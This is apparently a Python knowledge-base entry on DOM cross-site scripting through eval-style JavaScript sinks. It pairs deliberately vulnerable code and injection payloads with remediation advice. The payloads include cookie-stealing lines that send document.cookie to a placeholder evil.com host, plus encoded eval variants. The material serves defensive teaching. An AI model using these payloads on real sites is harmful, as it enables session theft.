#!/usr/bin/env python3

"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2026-01-09 22:12:40 UTC
Status: Created
Telegram: https://t.me/EasyProTech

Knowledge Base: DOM XSS via JavaScript Execution Sinks
Critical severity context for eval-like DOM XSS vulnerabilities.
"""

DETAILS = {
    "title": "DOM XSS via JavaScript Execution Sink",
    # Metadata for SIEM/Triage Integration
    "severity": "critical",
    "cvss_score": 9.0,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H",
    "reliability": "certain",
    "cwe": ["CWE-79", "CWE-95"],
    "owasp": ["A03:2021"],
    "tags": [
        "xss",
        "dom",
        "eval",
        "setTimeout",
        "setInterval",
        "Function",
        "code-execution",
        "critical",
        "client-side",
    ],
    "description": """
DOM XSS through JavaScript execution sinks occurs when user-controllable input flows
directly into functions that evaluate strings as JavaScript code. This is CRITICAL
severity because the attacker's input is executed as arbitrary JavaScript without
any HTML parsing or encoding considerations.

DANGEROUS SINKS (JavaScript Execution):
- eval(userInput)
- setTimeout(userInput, delay)     // String form only
- setInterval(userInput, delay)    // String form only
- new Function(userInput)
- new Function('arg', userInput)
- execScript(userInput)            // Legacy IE
- script.text = userInput
- script.textContent = userInput

Unlike innerHTML-based DOM XSS (which requires HTML context breakout), these sinks
execute JavaScript directly. No encoding bypass needed - raw code execution.

SEVERITY: CRITICAL (CVSS 9.0)
This is equivalent to direct JavaScript context injection. The attacker has full
control over code execution in the victim's browser context.

COMMON VULNERABLE PATTERNS:
1. Timer functions with string arguments from URL parameters
2. Dynamic script generation from user input
3. JSONP-like callbacks with user-controlled function names
4. eval() of user-provided JSON or configuration
5. Function constructor for dynamic code generation

REAL-WORLD EXAMPLE (Google XSS Game Level 4):
Vulnerable code: setTimeout("startTimer('" + timer + "')", 0);
Attack: timer=');alert(1)//
Result: setTimeout("startTimer('');alert(1)//')", 0);
""",
    "attack_vector": """
DOM XSS JAVASCRIPT EXECUTION SINKS:

1. EVAL() INJECTION:
   Vulnerable code:
   const config = eval('(' + userInput + ')');

   Attack payload:
   ');alert(document.cookie)//

   Result:
   eval('(' + ');alert(document.cookie)//' + ')');

2. SETTIMEOUT() STRING INJECTION:
   Vulnerable code:
   const delay = getParam('delay');
   setTimeout("processData('" + delay + "')", 1000);

   Attack URL:
   ?delay=');alert(1)//

   Result:
   setTimeout("processData('');alert(1)//')", 1000);

3. SETINTERVAL() STRING INJECTION:
   Vulnerable code:
   setInterval("updateStatus('" + status + "')", 5000);

   Attack:
   status=');fetch('//evil.com/'+document.cookie)//

4. FUNCTION CONSTRUCTOR:
   Vulnerable code:
   const fn = new Function('data', userInput);

   Attack:
   alert(document.cookie)//

   Result:
   new Function('data', 'alert(document.cookie)//');

5. DYNAMIC SCRIPT CONTENT:
   Vulnerable code:
   const script = document.createElement('script');
   script.textContent = 'var config = ' + userInput;
   document.head.appendChild(script);

   Attack:
   1;alert(1)//

6. JSONP CALLBACK INJECTION:
   Vulnerable code:
   const callback = getParam('callback');
   eval(callback + '(' + JSON.stringify(data) + ')');

   Attack URL:
   ?callback=alert

7. INDIRECT EVAL VIA ARRAY:
   Vulnerable code:
   [].constructor.constructor(userInput)();

   Attack:
   alert(document.cookie)

8. WINDOW SETTIMEOUT:
   Vulnerable code:
   window.setTimeout(userInput, 0);

   Attack:
   alert(1)

DETECTION PAYLOADS:

Basic detection:
');alert(1)//
');alert(String.fromCharCode(88,83,83))//
');confirm(1)//
');prompt(1)//

Cookie exfiltration:
');fetch('//evil.com/?c='+document.cookie)//
');new Image().src='//evil.com/?c='+document.cookie//

Encoded variants:
');eval(atob('YWxlcnQoMSk='))//
');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//

SOURCE-TO-SINK FLOW:
Source: location.search, location.hash, postMessage, localStorage
  |
  v
Processing: decodeURIComponent(), substring(), split()
  |
  v
Sink: eval(), setTimeout(), setInterval(), Function()
  |
  v
Result: Arbitrary JavaScript execution
""",
    "remediation": """
CRITICAL: NEVER USE STRING ARGUMENTS WITH TIMER FUNCTIONS

1. USE FUNCTION REFERENCES INSTEAD OF STRINGS:

   DANGEROUS:
   setTimeout("processData('" + userInput + "')", 1000);

   SAFE:
   setTimeout(function() {
       processData(sanitizedInput);
   }, 1000);

   SAFE (Arrow function):
   setTimeout(() => processData(sanitizedInput), 1000);

2. AVOID EVAL() ENTIRELY:

   DANGEROUS:
   const config = eval('(' + userInput + ')');

   SAFE:
   const config = JSON.parse(userInput);

3. USE JSON.PARSE() FOR DATA:

   DANGEROUS:
   eval('var data = ' + jsonString);

   SAFE:
   const data = JSON.parse(jsonString);

4. VALIDATE CALLBACK NAMES (JSONP):

   DANGEROUS:
   eval(callback + '(data)');

   SAFE:
   if (/^[a-zA-Z_$][a-zA-Z0-9_$]*$/.test(callback)) {
       window[callback](data);
   }

   BETTER: Don't use JSONP, use CORS instead.

5. CONTENT SECURITY POLICY:

   Block eval and string-based timers:
   Content-Security-Policy: script-src 'self'; // No 'unsafe-eval'

   This blocks:
   - eval()
   - new Function()
   - setTimeout(string)
   - setInterval(string)

6. TRUSTED TYPES API:

   Content-Security-Policy: require-trusted-types-for 'script'

   const policy = trustedTypes.createPolicy('default', {
       createScript: (input) => {
           throw new TypeError('Scripts not allowed');
       }
   });

7. INPUT VALIDATION:

   For numeric inputs:
   const delay = parseInt(userInput, 10);
   if (isNaN(delay) || delay < 0 || delay > 60000) {
       delay = 1000; // Default
   }
   setTimeout(callback, delay);

   For identifiers:
   if (!/^[a-zA-Z_][a-zA-Z0-9_]*$/.test(userInput)) {
       throw new Error('Invalid identifier');
   }

8. STATIC ANALYSIS:

   ESLint rules:
   {
       "no-eval": "error",
       "no-implied-eval": "error",
       "no-new-func": "error"
   }

   Semgrep rules for setTimeout/setInterval with strings.

SECURITY CHECKLIST:

[ ] No eval() with user input
[ ] No setTimeout/setInterval with string arguments
[ ] No new Function() with user input
[ ] No script.textContent with user input
[ ] CSP blocks 'unsafe-eval'
[ ] Trusted Types enforced
[ ] JSONP replaced with CORS
[ ] Static analysis configured
[ ] Code review for all dynamic code generation

TESTING:

1. Identify all uses of eval, setTimeout, setInterval, Function
2. Trace data flow from sources to these sinks
3. Test with payloads: ');alert(1)//
4. Verify CSP blocks execution
5. Check for indirect eval patterns

TOOLS:
- ESLint with security plugins
- Semgrep for taint analysis
- DOM Invader (Burp Suite)
- Browser DevTools for tracing

OWASP REFERENCES:
- CWE-79: Cross-site Scripting
- CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code
- OWASP DOM XSS Prevention Cheat Sheet
""",
}
